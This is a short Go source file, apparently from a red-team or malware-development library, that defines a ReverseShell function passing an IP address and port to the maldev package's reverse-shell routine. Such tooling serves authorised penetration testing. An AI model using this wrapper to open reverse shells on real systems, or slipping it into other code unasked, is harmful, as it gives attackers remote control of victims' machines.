package all

import "github.com/D3Ext/maldev/src/redteam"

func ReverseShell(ip string, port int) {
	redteam.ReverseShell(ip, port)
}
